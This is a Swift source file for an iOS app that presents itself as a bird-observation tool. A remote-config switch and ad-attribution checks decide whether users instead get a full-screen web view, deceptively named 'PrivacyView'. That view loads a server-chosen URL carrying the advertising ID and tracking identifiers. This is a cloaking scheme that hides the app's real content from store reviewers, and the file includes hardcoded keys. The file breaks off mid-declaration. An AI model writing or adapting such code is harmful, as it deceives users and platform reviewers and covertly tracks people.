import SwiftUI
import Combine

@main
struct RareRed_WingsApp: App {
    
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    
    var body: some Scene {
        WindowGroup {
            BlackWindow(rootView: RootView()
                .environmentObject(AppRouter.shared)
                .environmentObject(TabbarService.shared)
                .environmentObject(BirdMarkService.shared)
                .environmentObject(ObservationService.shared)
                .environmentObject(SettingsService.shared)
                .dynamicTypeSize(.large)
                .preferredColorScheme(.light)
                .background(.white), remoteConfigKey: AppConstants.remoteConfigKey)
        }
    }
}

import SwiftUI
import CryptoKit
import WebKit
import AppTrackingTransparency
import UIKit
import FirebaseCore
import FirebaseRemoteConfig
import OneSignalFramework
import AdSupport
import AppsFlyerLib
import Network

struct AppConstants {
    static let metricsBaseURL = "https://biredbo.com/app/metrics"
    static let salt = "XH9hN1DDywFHLzRToPSdGkyGNoaZfsPZ"
    static let oneSignalAppID = "7e18e0ef-42f6-4d88-945d-c343f8feb6eb"
    static let userDefaultsKey = "rare"
    static let remoteConfigStateKey = "rareRed"
    static let userUUIDKey = "userUUID"
    static let configStrategyKey = "rareRedWingsConfigStrategy"
    
    static let remoteConfigKey = "isRedWingsEnable"
    static let appsFlyerDevKeyConfigKey = "appsflyer_dev_key"
    static let appsFlyerCampaignURLKey = "appsflyer_campaign_url"
    static let loaderVersionConfigKey = "loader_version"
    static let appsFlyerAppID = "6754912456"
    
    static let primaryConfigTimeout: TimeInterval = 10.0
    static let appsFlyerDataTimeout: TimeInterval = 15.0
}
struct MetricsResponse {
    let isOrganic: Bool
    let url: String
    let parameters: [String: String]
}

enum ConfigStrategy: String {
    case primary
    case fallback
    case none
}

enum LoaderVersion: Int {
    case defaultLoader = 0
    case versionOne = 1
    case versionTwo = 2
    
    static var current: LoaderVersion {
        let value = UserDefaults.standard.integer(forKey: "cached_loader_version")
        return LoaderVersion(rawValue: value) ?? .defaultLoader
    }
}

struct LoaderScreens {
    @ViewBuilder
    static func versionOneScreen(onActionCompleted: @escaping () -> Void) -> some View {
        VersionOne()
            .modifier(LoaderActionModifier(
                triggerType: .manual,
                onActionCompleted: onActionCompleted
            ))
            .onReceive(NotificationCenter.default.publisher(for: .loaderActionTriggered)) { _ in
                onActionCompleted()
            }
    }
    
    @ViewBuilder
    static func versionTwoScreen(onActionCompleted: @escaping () -> Void) -> some View {
        VersionTwo()
            .modifier(LoaderActionModifier(
                triggerType: .automatic(delay: 4.0),
                onActionCompleted: onActionCompleted
            ))
    }
}

extension Notification.Name {
    static let loaderActionTriggered = Notification.Name("loaderActionTriggered")
}

struct LoaderActionModifier: ViewModifier {
    enum TriggerType {
        case manual
        case automatic(delay: TimeInterval)
    }
    
    let triggerType: TriggerType
    let onActionCompleted: () -> Void
    @StateObject private var preloader = WebViewPreloader()
    @State private var hasTransitioned = false
    
    func body(content: Content) -> some View {
        content
            .onAppear {
                preloader.startPreloading()
                if case .automatic(let delay) = triggerType {
                    DispatchQueue.main.asyncAfter(deadline: .now() + delay) {
                        if !hasTransitioned {
                            hasTransitioned = true
                            onActionCompleted()
                        }
                    }
                }
            }
    }
}

class WebViewPreloader: ObservableObject {
    @Published var isReady = false
    private var webView: WKWebView?
    
    func startPreloading() {
        guard webView == nil else { return }
        DispatchQueue.main.async {
            let configuration = WKWebViewConfiguration()
            configuration.allowsInlineMediaPlayback = true
            self.webView = WKWebView(frame: .zero, configuration: configuration)
            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                self.isReady = true
            }
        }
    }
    
    deinit {
        webView?.stopLoading()
        webView = nil
    }
}

final class TrackingService {
    static let shared = TrackingService()
    private init() {}
    
    func getIDFA() -> String {
        if #available(iOS 14, *) {
            if ATTrackingManager.trackingAuthorizationStatus == .authorized {
                return ASIdentifierManager.shared().advertisingIdentifier.uuidString
            }
        } else {
            if ASIdentifierManager.shared().isAdvertisingTrackingEnabled {
                return ASIdentifierManager.shared().advertisingIdentifier.uuidString
            }
        }
        return "00000000-0000-0000-0000-000000000000"
    }
    
    func checkInternetConnection() -> Bool {
        let monitor = NWPathMonitor()
        let semaphore = DispatchSemaphore(value: 0)
        var isConnected = false
        monitor.pathUpdateHandler = { path in
            isConnected = path.status == .satisfied
            semaphore.signal()
        }
        let queue = DispatchQueue(label: "InternetConnectionCheck")
        monitor.start(queue: queue)
        _ = semaphore.wait(timeout: .now() + 1.0)
        monitor.cancel()
        return isConnected
    }
}

class NetworkManager {
    static let shared = NetworkManager()
    private init() {}
    
    func fetchMetrics(bundleID: String, salt: String, idfa: String?, completion: @escaping (Result<MetricsResponse, Error>) -> Void) {
        let rawT = "\(salt):\(bundleID)"
        let hashedT = CryptoUtils.md5Hex(rawT)
        var components = URLComponents(string: AppConstants.metricsBaseURL)
        components?.queryItems = [
            URLQueryItem(name: "b", value: bundleID),
            URLQueryItem(name: "t", value: hashedT)
        ]
        guard let url = components?.url else {
            completion(.failure(NetworkError.invalidURL))
            return
        }
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.setValue("application/json", forHTTPHeaderField: "Accept")
        request.timeoutInterval = AppConstants.primaryConfigTimeout
        URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                completion(.failure(error))
                return
            }
            if let httpResponse = response as? HTTPURLResponse {
                if httpResponse.statusCode != 200 {
                    completion(.failure(NetworkError.badStatusCode(httpResponse.statusCode)))
                    return
                }
            }
            guard let data = data, !data.isEmpty else {
                completion(.failure(NetworkError.noData))
                return
            }
            do {
                if let json = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
                    guard let urlString = json["URL"] as? String, !urlString.isEmpty else {
                        completion(.failure(NetworkError.invalidResponse))
                        return
                    }
                    let isOrganic = json["is_organic"] as? Bool ?? false
                    let parameters = json.filter { $0.key != "is_organic" && $0.key != "URL" }
                        .compactMapValues { $0 as? String }
                    let response = MetricsResponse(
                        isOrganic: isOrganic,
                        url: urlString,
                        parameters: parameters
                    )
                    completion(.success(response))
                } else {
                    completion(.failure(NetworkError.invalidResponse))
                }
            } catch {
                completion(.failure(error))
            }
        }.resume()
    }
}

enum NetworkError: Error {
    case invalidURL
    case noData
    case invalidResponse
    case badStatusCode(Int)
}

class ConfigManager {
    static let shared = ConfigManager()
    
    private let remoteConfig = RemoteConfig.remoteConfig()
    private let defaults: [String: NSObject] = [
        AppConstants.remoteConfigKey: true as NSNumber,
        AppConstants.appsFlyerDevKeyConfigKey: "" as NSString,
        AppConstants.appsFlyerCampaignURLKey: "" as NSString,
        AppConstants.loaderVersionConfigKey: 0 as NSNumber
    ]
    
    var appsFlyerDevKey: String = ""
    var appsFlyerCampaignURL: String = ""
    var loaderVersion: LoaderVersion {
        let cachedValue = UserDefaults.standard.integer(forKey: "cached_loader_version")
        return LoaderVersion(rawValue: cachedValue) ?? .defaultLoader
    }
    
    private init() {
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 3600
        settings.fetchTimeout = 5
        remoteConfig.configSettings = settings
        remoteConfig.setDefaults(defaults)
        loadCachedValues()
    }
    
    func fetchConfig(completion: @escaping (Bool) -> Void) {
        if let savedState = UserDefaults.standard.object(forKey: AppConstants.remoteConfigStateKey) as? Bool {
            completion(savedState)
            fetchConfigInBackground()
            return
        }
        remoteConfig.fetch(withExpirationDuration: 0) { status, error in
            if status == .success {
                self.remoteConfig.activate { _, _ in
                    self.updateConfigValues()
                    let isEnabled = self.remoteConfig.configValue(forKey: AppConstants.remoteConfigKey).boolValue
                    completion(isEnabled)
                }
            } else {
                UserDefaults.standard.set(true, forKey: AppConstants.remoteConfigStateKey)
                self.loadCachedValues()
                completion(true)
            }
        }
    }
    
    private func fetchConfigInBackground() {
        remoteConfig.fetch(withExpirationDuration: 0) { status, error in
            if status == .success {
                self.remoteConfig.activate { _, _ in
                    self.updateConfigValues()
                }
            }
        }
    }
    
    private func updateConfigValues() {
        let isEnabled = self.remoteConfig.configValue(forKey: AppConstants.remoteConfigKey).boolValue
        self.appsFlyerDevKey = self.remoteConfig.configValue(forKey: AppConstants.appsFlyerDevKeyConfigKey).stringValue
        self.appsFlyerCampaignURL = self.remoteConfig.configValue(forKey: AppConstants.appsFlyerCampaignURLKey).stringValue
        let loaderVersionInt = self.remoteConfig.configValue(forKey: AppConstants.loaderVersionConfigKey).numberValue.intValue
        UserDefaults.standard.set(loaderVersionInt, forKey: "cached_loader_version")
        UserDefaults.standard.set(isEnabled, forKey: AppConstants.remoteConfigStateKey)
        UserDefaults.standard.set(self.appsFlyerDevKey, forKey: "cached_af_dev_key")
        UserDefaults.standard.set(self.appsFlyerCampaignURL, forKey: "cached_af_campaign_url")
    }
    
    private func loadCachedValues() {
        appsFlyerDevKey = UserDefaults.standard.string(forKey: "cached_af_dev_key") ?? ""
        appsFlyerCampaignURL = UserDefaults.standard.string(forKey: "cached_af_campaign_url") ?? ""
    }
    
    func getSavedURL() -> URL? {
        guard let urlString = UserDefaults.standard.string(forKey: AppConstants.userDefaultsKey),
              let url = URL(string: urlString) else {
            return nil
        }
        return url
    }
    
    func saveURL(_ url: URL) {
        UserDefaults.standard.set(url.absoluteString, forKey: AppConstants.userDefaultsKey)
    }
}

class PermissionManager {
    static let shared = PermissionManager()
    
    private var hasRequestedTracking = false
    
    private init() {}
    
    func requestNotificationPermission(completion: @escaping (Bool) -> Void) {
        OneSignal.Notifications.requestPermission({ accepted in
            DispatchQueue.main.async {
                completion(accepted)
            }
        }, fallbackToSettings: false)
    }
    
    func requestTrackingAuthorization(completion: @escaping (String?) -> Void) {
        if #available(iOS 14, *) {
            func checkAndRequest() {
                let status = ATTrackingManager.trackingAuthorizationStatus
                switch status {
                case .notDetermined:
                    ATTrackingManager.requestTrackingAuthorization { newStatus in
                        DispatchQueue.main.async {
                            if newStatus == .notDetermined {
                                DispatchQueue.main.asyncAfter(deadline: .now() + 1) {
                                    checkAndRequest()
                                }
                            } else {
                                self.hasRequestedTracking = true
                                let idfa = newStatus == .authorized ? ASIdentifierManager.shared().advertisingIdentifier.uuidString : nil
                                completion(idfa)
                            }
                        }
                    }
                default:
                    DispatchQueue.main.async {
                        self.hasRequestedTracking = true
                        let idfa = status == .authorized ? ASIdentifierManager.shared().advertisingIdentifier.uuidString : nil
                        completion(idfa)
                    }
                }
            }
            
            DispatchQueue.main.async {
                checkAndRequest()
            }
        } else {
            DispatchQueue.main.async {
                self.hasRequestedTracking = true
                let idfa = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                completion(idfa)
            }
        }
    }
}

final class AppsFlyerService: NSObject, AppsFlyerLibDelegate {
    static let shared = AppsFlyerService()
    private(set) var conversionData: [String: String] = [:]
    private(set) var deeplinkParams: [String: String] = [:]
    private(set) var isDataReceived = false
    var onDataReceived: (() -> Void)?
    
    private override init() {
        super.init()
    }
    
    func configure(withDevKey devKey: String, appID: String) {
        guard !devKey.isEmpty else { return }
        let appsFlyer = AppsFlyerLib.shared()
        appsFlyer.appsFlyerDevKey = devKey
        appsFlyer.appleAppID = appID
        appsFlyer.delegate = self
        appsFlyer.isDebug = true
        appsFlyer.waitForATTUserAuthorization(timeoutInterval: 60)
    }
    
    func start() {
        AppsFlyerLib.shared().start()
    }
    
    func getAppsFlyerUID() -> String {
        return AppsFlyerLib.shared().getAppsFlyerUID()
    }
    
    func extractParameters() -> [String: String] {
        var params: [String: String] = [:]
        let allKeys = [
            "app_name", "tm_id", "cm_id",
            "sub_id_1", "sub_id_2", "sub_id_3", "sub_id_4", "sub_id_5",
            "sub_id_6", "sub_id_7", "sub_id_8", "sub_id_9", "sub_id_10",
            "sub_id_11", "sub_id_12", "sub_id_13", "sub_id_14", "sub_id_15"
        ]
        for key in allKeys {
            if let value = conversionData[key] ?? deeplinkParams[key],
               value != "null", !value.isEmpty {
                params[key] = value
            }
        }
        let afID = getAppsFlyerUID()
        params["appsflyer_id"] = afID
        if let uuid = UserDefaults.standard.string(forKey: AppConstants.userUUIDKey) {
            params["onesignal_external_id"] = uuid
        }
        return params
    }
    
    func isOrganic() -> Bool {
        if let afStatus = conversionData["af_status"], afStatus == "Organic" {
            return true
        }
        if let mediaSource = conversionData["media_source"],
           !mediaSource.isEmpty, mediaSource != "null" {
            return false
        }
        return true
    }
    
    func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
        conversionData = convertToDictionary(conversionInfo)
        isDataReceived = true
        onDataReceived?()
        NotificationCenter.default.post(name: .appsFlyerDataReceived, object: nil)
    }
    
    func onConversionDataFail(_ error: Error) {
    }
    
    func onAppOpenAttribution(_ attributionData: [AnyHashable : Any]) {
        deeplinkParams = convertToDictionary(attributionData)
        isDataReceived = true
        onDataReceived?()
        NotificationCenter.default.post(name: .appsFlyerDataReceived, object: nil)
    }
    
    func onAppOpenAttributionFailure(_ error: Error) {
    }
    
    private func convertToDictionary(_ data: [AnyHashable: Any]) -> [String: String] {
        var result: [String: String] = [:]
        for (key, value) in data {
            if let keyString = key as? String {
                let valueString = "\(value)"
                result[keyString] = valueString == "<null>" ? "null" : valueString
            }
        }
        return result
    }
    
    func logEvent(_ eventName: String) {
        AppsFlyerLib.shared().logEvent(eventName, withValues: nil)
    }
}
struct TrackingURLBuilder {
    static func buildTrackingURL(from response: MetricsResponse, idfa: String?, bundleID: String) -> URL? {
        let onesignalId = OneSignal.User.onesignalId
        
        if response.isOrganic {
            guard var components = URLComponents(string: response.url) else {
                return nil
            }
            
            var queryItems: [URLQueryItem] = components.queryItems ?? []
            if let idfa = idfa {
                queryItems.append(URLQueryItem(name: "idfa", value: idfa))
            }
            queryItems.append(URLQueryItem(name: "bundle", value: bundleID))
            
            if let onesignalId = onesignalId {
                queryItems.append(URLQueryItem(name: "onesignal_id", value: onesignalId))
            }
            components.queryItems = queryItems.isEmpty ? nil : queryItems
            guard let url = components.url else {
                return nil
            }
            return url
        } else {
            let subId2 = response.parameters["sub_id_2"]
            let baseURLString = subId2 != nil ? "\(response.url)/\(subId2!)" : response.url
            
            guard var newComponents = URLComponents(string: baseURLString) else {
                return nil
            }
            
            var queryItems: [URLQueryItem] = []
            queryItems = response.parameters
                .filter { $0.key != "sub_id_2" }
                .map { URLQueryItem(name: $0.key, value: $0.value) }
            queryItems.append(URLQueryItem(name: "bundle", value: bundleID))
            if let idfa = idfa {
                queryItems.append(URLQueryItem(name: "idfa", value: idfa))
            }
            
            if let onesignalId = onesignalId {
                queryItems.append(URLQueryItem(name: "onesignal_id", value: onesignalId))
            }
            newComponents.queryItems = queryItems.isEmpty ? nil : queryItems
            guard let finalURL = newComponents.url else {
                return nil
            }
            return finalURL
        }
    }
}
struct BlackWindow<RootView: View>: View {
    @StateObject private var viewModel = BlackWindowViewModel()
    private let remoteConfigKey: String
    let rootView: RootView
    
    init(rootView: RootView, remoteConfigKey: String) {
        self.rootView = rootView
        self.remoteConfigKey = remoteConfigKey
    }
    
    var body: some View {
        Group {
            if viewModel.isRemoteConfigFetched && !viewModel.isEnabled && viewModel.isTrackingPermissionResolved && viewModel.isNotificationPermissionResolved {
                rootView
            }
            else if viewModel.isRemoteConfigFetched && viewModel.isEnabled && viewModel.trackingURL != nil && viewModel.shouldShowWebView && viewModel.showFinalWebView {
                ZStack {
                    Color.black
                        .ignoresSafeArea()
                    PrivacyView(ref: viewModel.trackingURL!)
                }
            }
            else if viewModel.isRemoteConfigFetched && viewModel.isEnabled && viewModel.trackingURL != nil && viewModel.shouldShowWebView && !viewModel.showFinalWebView {
                loaderView
            }
            else {
                ZStack {
                    rootView
                }
            }
        }
        .alert("No Internet Connection", isPresented: $viewModel.showNoInternetAlert) {
            Button("Close App") {
                exit(0)
            }
        } message: {
            Text("Please check your internet connection and restart the app to continue.")
        }
    }
    
    @ViewBuilder
    private var loaderView: some View {
        let loaderVersion = LoaderVersion.current
        switch loaderVersion {
        case .defaultLoader:
            ZStack {
                Color.black
                    .ignoresSafeArea()
                PrivacyView(ref: viewModel.trackingURL!)
            }
            .onAppear {
                viewModel.showFinalWebView = true
            }
            
        case .versionOne:
            LoaderScreens.versionOneScreen {
                viewModel.handleLoaderAction()
            }
            
        case .versionTwo:
            LoaderScreens.versionTwoScreen {
                viewModel.handleLoaderAction()
            }
        }
    }
}

class AppDelegate: NSObject, UIApplicationDelegate, UNUserNotificationCenterDelegate {
    private var lastPermissionCheck: Date?
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]? = nil) -> Bool {
        FirebaseApp.configure()
        OneSignal.Debug.setLogLevel(.LL_VERBOSE)
        OneSignal.initialize(AppConstants.oneSignalAppID, withLaunchOptions: launchOptions)
        UNUserNotificationCenter.current().delegate = self
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(handleTrackingAction),
            name: UIApplication.didBecomeActiveNotification,
            object: nil
        )
        return true
    }
    
    func applicationDidBecomeActive(_ application: UIApplication) {
        AppsFlyerService.shared.start()
    }
    
    @objc private func handleTrackingAction() {
        if UIApplication.shared.applicationState == .active {
            let now = Date()
            if let last = lastPermissionCheck, now.timeIntervalSince(last) < 2 {
                return
            }
            lastPermissionCheck = now
            AppsFlyerService.shared.start()
            NotificationCenter.default.post(name: .checkTrackingPermission, object: nil)
        }
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                willPresent notification: UNNotification,
                                withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        completionHandler([.banner, .sound, .badge])
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                didReceive response: UNNotificationResponse,
                                withCompletionHandler completionHandler: @escaping () -> Void) {
        completionHandler()
    }
    
    deinit {
        NotificationCenter.default.removeObserver(self, name: UIApplication.didBecomeActiveNotification, object: nil)
    }
}

class BlackWindowViewModel: ObservableObject {
    @Published var trackingURL: URL?
    @Published var shouldShowWebView = false
    @Published var isRemoteConfigFetched = false
    @Published var isEnabled = false
    @Published var isTrackingPermissionResolved = false
    @Published var isNotificationPermissionResolved = false
    @Published var isWebViewLoadingComplete = false
    @Published var showFinalWebView = false
    @Published var currentStrategy: ConfigStrategy = .none
    @Published var isAppsFlyerReady = false
    @Published var showNoInternetAlert = false
    
    private var hasFetchedMetrics = false
    private var hasPostedInitialCheck = false
    private var appsFlyerTimeout: DispatchWorkItem?
    
    init() {
        setupObservers()
        setupAppsFlyerCallbacks()
        setupUserUUID()
        initialize()
    }
    
    private func setupObservers() {
        NotificationCenter.default.addObserver(
            forName: .didFetchTrackingURL,
            object: nil,
            queue: .main
        ) { [weak self] notification in
            if let url = notification.userInfo?["trackingURL"] as? URL {
                self?.trackingURL = url
                self?.shouldShowWebView = true
                self?.isWebViewLoadingComplete = true
                ConfigManager.shared.saveURL(url)
            }
        }
        
        NotificationCenter.default.addObserver(
            forName: .checkTrackingPermission,
            object: nil,
            queue: .main
        ) { [weak self] _ in
            self?.handlePermissionCheck()
        }
        
        NotificationCenter.default.addObserver(
            forName: .notificationPermissionResolved,
            object: nil,
            queue: .main
        ) { [weak self] _ in
            if !(self?.isTrackingPermissionResolved ?? false) {
                NotificationCenter.default.post(name: .checkTrackingPermission, object: nil)
            }
        }
        NotificationCenter.default.addObserver(
            forName: .appsFlyerDataReceived,
            object: nil,
            queue: .main
        ) { [weak self] _ in
            self?.isAppsFlyerReady = true
            self?.appsFlyerTimeout?.cancel()
            if self?.currentStrategy == .primary {
                self?.checkAppsFlyerData()
            }
        }
    }
    
    private func setupAppsFlyerCallbacks() {
        AppsFlyerService.shared.onDataReceived = { [weak self] in
            self?.isAppsFlyerReady = true
            self?.appsFlyerTimeout?.cancel()
            if self?.currentStrategy == .primary {
                self?.checkAppsFlyerData()
            }
        }
    }
    
    private func setupUserUUID() {
        let uuidKey = AppConstants.userUUIDKey
        if UserDefaults.standard.string(forKey: uuidKey) == nil {
            let newUUID = UUID().uuidString
            UserDefaults.standard.set(newUUID, forKey: uuidKey)
        }
        if let uuid = UserDefaults.standard.string(forKey: uuidKey) {
            OneSignal.login(uuid)
        }
    }
    
    private func initialize() {
        if !hasPostedInitialCheck {
            hasPostedInitialCheck = true
            NotificationCenter.default.post(name: .checkTrackingPermission, object: nil)
        }
        
        ConfigManager.shared.fetchConfig { [weak self] isEnabled in
            DispatchQueue.main.async {
                self?.isEnabled = isEnabled
                self?.isRemoteConfigFetched = true
                let devKey = ConfigManager.shared.appsFlyerDevKey
                if !devKey.isEmpty {
                    AppsFlyerService.shared.configure(
                        withDevKey: devKey,
                        appID: AppConstants.appsFlyerAppID
                    )
                }
                self?.handleConfigFetched()
            }
        }
    }
    
    private func handlePermissionCheck() {
        if !isNotificationPermissionResolved {
            PermissionManager.shared.requestNotificationPermission { [weak self] accepted in
                self?.isNotificationPermissionResolved = true
                NotificationCenter.default.post(
                    name: .notificationPermissionResolved,
                    object: nil,
                    userInfo: ["accepted": accepted]
                )
            }
        } else if !isTrackingPermissionResolved {
            PermissionManager.shared.requestTrackingAuthorization { [weak self] idfa in
                self?.isTrackingPermissionResolved = true
                self?.handlePermissionsResolved(idfa: idfa)
            }
        }
    }
    
    private func handleConfigFetched() {
        if isEnabled {
            if let savedURL = ConfigManager.shared.getSavedURL() {
                if isTrackingPermissionResolved && isNotificationPermissionResolved {
                    if !TrackingService.shared.checkInternetConnection() {
                        showNoInternetAlert = true
                        return
                    }
                    trackingURL = savedURL
                    shouldShowWebView = true
                    isWebViewLoadingComplete = true
                    showFinalWebView = true
                } else {
                    waitForPermissions(savedURL: savedURL)
                }
            } else if isTrackingPermissionResolved && isNotificationPermissionResolved {
                startConfigFetch()
            }
        } else if isTrackingPermissionResolved && isNotificationPermissionResolved {
            currentStrategy = .none
            triggerSplashTransition()
        }
    }
    
    private func handlePermissionsResolved(idfa: String?) {
        if isEnabled && ConfigManager.shared.getSavedURL() == nil {
            startConfigFetch()
        }
        if isRemoteConfigFetched && !isEnabled && isNotificationPermissionResolved {
            currentStrategy = .none
            triggerSplashTransition()
        }
    }
    
    private func startConfigFetch() {
        AppsFlyerService.shared.start()
        DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) { [weak self] in
            self?.attemptAppsFlyerConfig()
        }
    }
    
    private func attemptAppsFlyerConfig() {
        currentStrategy = .primary
        if isAppsFlyerReady {
            checkAppsFlyerData()
        } else {
            let timeout = DispatchWorkItem { [weak self] in
                self?.attemptFBConfig()
            }
            appsFlyerTimeout = timeout
            DispatchQueue.main.asyncAfter(deadline: .now() + AppConstants.appsFlyerDataTimeout, execute: timeout)
        }
    }
    
    private func checkAppsFlyerData() {
        if AppsFlyerService.shared.isOrganic() {
            attemptFBConfig()
            return
        }
        buildAppsFlyerURL()
    }
    
    private func buildAppsFlyerURL() {
        let params = AppsFlyerService.shared.extractParameters()
        guard !params.isEmpty else {
            attemptFBConfig()
            return
        }
        let baseURLString = ConfigManager.shared.appsFlyerCampaignURL
        guard !baseURLString.isEmpty, let baseURL = URL(string: baseURLString) else {
            attemptFBConfig()
            return
        }
        
        let bundleID = Bundle.main.bundleIdentifier ?? "none"
        let idfa = TrackingService.shared.getIDFA()
        let onesignalID = OneSignal.User.onesignalId
        
        if let finalURL = buildFinalURL(
            baseURL: baseURL,
            params: params,
            idfa: idfa,
            bundleID: bundleID,
            onesignalID: onesignalID
        ) {
            handleAppsFlyerSuccess(url: finalURL)
        } else {
            attemptFBConfig()
        }
    }
    
    private func buildFinalURL(
        baseURL: URL,
        params: [String: String],
        idfa: String?,
        bundleID: String,
        onesignalID: String?
    ) -> URL? {
        guard let cmId = params["cm_id"], !cmId.isEmpty else {
            return nil
        }
        var urlString = baseURL.absoluteString
        if !urlString.hasSuffix("/") {
            urlString += "/"
        }
        urlString += cmId
        guard var components = URLComponents(string: urlString) else {
            return nil
        }
        var queryItems: [URLQueryItem] = []
        if let appName = params["app_name"] {
            queryItems.append(URLQueryItem(name: "app_name", value: appName))
        }
        if let tmId = params["tm_id"] {
            queryItems.append(URLQueryItem(name: "tm_id", value: tmId))
        }
        for i in 1...15 {
            let key = "sub_id_\(i)"
            if let value = params[key] {
                queryItems.append(URLQueryItem(name: key, value: value))
            }
        }
        queryItems.append(URLQueryItem(name: "bundle", value: bundleID))
        if let onesignalID = onesignalID, !onesignalID.isEmpty {
            queryItems.append(URLQueryItem(name: "onesignal_id", value: onesignalID))
        }
        if let appsflyerId = params["appsflyer_id"] {
            queryItems.append(URLQueryItem(name: "appsflyer_id", value: appsflyerId))
        }
        if let idfa = idfa, !idfa.isEmpty {
            queryItems.append(URLQueryItem(name: "idfa", value: idfa))
        }
        components.queryItems = queryItems
        return components.url
    }
    
    private func handleAppsFlyerSuccess(url: URL) {
        trackingURL = url
        shouldShowWebView = true
        ConfigManager.shared.saveURL(url)
        UserDefaults.standard.set(ConfigStrategy.primary.rawValue, forKey: AppConstants.configStrategyKey)
        let loaderVersion = LoaderVersion.current
        if loaderVersion == .defaultLoader {
            isWebViewLoadingComplete = true
            showFinalWebView = true
        }
    }
    
    func handleLoaderAction() {
        withAnimation {
            showFinalWebView = true
        }
    }
    
    private func attemptFBConfig() {
        guard !hasFetchedMetrics else { return }
        hasFetchedMetrics = true
        currentStrategy = .fallback
        
        let bundleID = Bundle.main.bundleIdentifier ?? "none"
        let idfa = TrackingService.shared.getIDFA()
        
        NetworkManager.shared.fetchMetrics(bundleID: bundleID, salt: AppConstants.salt, idfa: idfa) { [weak self] result in
            DispatchQueue.main.async {
                switch result {
                case .success(let response):
                    if let url = TrackingURLBuilder.buildTrackingURL(from: response, idfa: idfa, bundleID: bundleID) {
                        self?.handleFBSuccess(url: url)
                    } else {
                        self?.fallbackToMainApp()
                    }
                case .failure:
                    self?.fallbackToMainApp()
                }
            }
        }
    }
    
    private func handleFBSuccess(url: URL) {
        trackingURL = url
        shouldShowWebView = true
        ConfigManager.shared.saveURL(url)
        UserDefaults.standard.set(ConfigStrategy.fallback.rawValue, forKey: AppConstants.configStrategyKey)
        let loaderVersion = LoaderVersion.current
        if loaderVersion == .defaultLoader {
            isWebViewLoadingComplete = true
            showFinalWebView = true
        }
    }
    
    private func fallbackToMainApp() {
        currentStrategy = .none
        isWebViewLoadingComplete = true
        triggerSplashTransition()
    }
    
    private func waitForPermissions(savedURL: URL) {
        func checkPermissions() {
            if isTrackingPermissionResolved && isNotificationPermissionResolved {
                if !TrackingService.shared.checkInternetConnection() {
                    self.showNoInternetAlert = true
                    return
                }
                self.trackingURL = savedURL
                self.shouldShowWebView = true
                self.isWebViewLoadingComplete = true
                self.showFinalWebView = true
            } else {
                DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                    checkPermissions()
                }
            }
        }
        
        DispatchQueue.main.async {
            checkPermissions()
        }
    }
    
    private func triggerSplashTransition() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            NotificationCenter.default.post(name: .splashTransition, object: nil)
        }
    }
    
    deinit {
        NotificationCenter.default.removeObserver(self)
        appsFlyerTimeout?.cancel()
    }
}

struct PrivacyView: UIViewRepresentable {
    typealias UIViewType = WKWebView
    
    let ref: URL
    private let webView: WKWebView
    
    init(ref: URL) {
        self.ref = ref
        let configuration = WKWebViewConfiguration()
        configuration.websiteDataStore = WKWebsiteDataStore.default()
        configuration.preferences = WKPreferences()
        configuration.preferences.javaScriptCanOpenWindowsAutomatically = true
        webView = WKWebView(frame: .zero, configuration: configuration)
    }
    
    func makeUIView(context: Context) -> WKWebView {
        webView.uiDelegate = context.coordinator
        webView.navigationDelegate = context.coordinator
        return webView
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {
        uiView.load(URLRequest(url: ref))
    }
    
    func makeCoordinator() -> Coordinator {
        Coordinator(self)
    }
    
    class Coordinator: NSObject, WKUIDelegate, WKNavigationDelegate {
        var parent: PrivacyView
        private var popupWebView: OverlayPrivacyWindowController?
        
        init(_ parent: PrivacyView) {
            self.parent = parent
        }
        
        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            configuration.websiteDataStore = WKWebsiteDataStore.default()
            let newOverlay = WKWebView(frame: parent.webView.bounds, configuration: configuration)
            newOverlay.autoresizingMask = [.flexibleWidth, .flexibleHeight]
            newOverlay.navigationDelegate = self
            newOverlay.uiDelegate = self
            webView.addSubview(newOverlay)
            
            let viewController = OverlayPrivacyWindowController()
            viewController.overlayView = newOverlay
            popupWebView = viewController
            UIApplication.topMostController()?.present(viewController, animated: true)
            
            return newOverlay
        }
        
        func webViewDidClose(_ webView: WKWebView) {
            popupWebView?.dismiss(animated: true)
        }
    }
}
class OverlayPrivacyWindowController: UIViewController {
    var overlayView: WKWebView!
    
    override func viewDidLoad() {
        super.viewDidLoad()
        overlayView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(overlayView)
        
        NSLayoutConstraint.activate([
            overlayView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            overlayView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            overlayView.topAnchor.constraint(equalTo: view.topAnchor),
            overlayView.bottomAnchor.constraint(equalTo: view.bottomAnchor)
        ])
    }
}

enum CryptoUtils {
    static func md5Hex(_ string: String) -> String {
        let digest = Insecure.MD5.hash(data: Data(string.utf8))
        return digest.map { String(format: "%02hhx", $0) }.joined()
    }
}
extension UIApplication {
    static var keyWindow: UIWindow {
        shared.connectedScenes
            .compactMap { ($0 as? UIWindowScene)?.keyWindow }
            .last!
    }
    
    class func topMostController(controller: UIViewController? = keyWindow.rootViewController) -> UIViewController? {
        if let navigationController = controller as? UINavigationController {
            return topMostController(controller: navigationController.visibleViewController)
        }
        if let tabController = controller as? UITabBarController, let selected = tabController.selectedViewController {
            return topMostController(controller: selected)
        }
        if let presented = controller?.presentedViewController {
            return topMostController(controller: presented)
        }
        return controller
    }
}

extension Notification.Name {
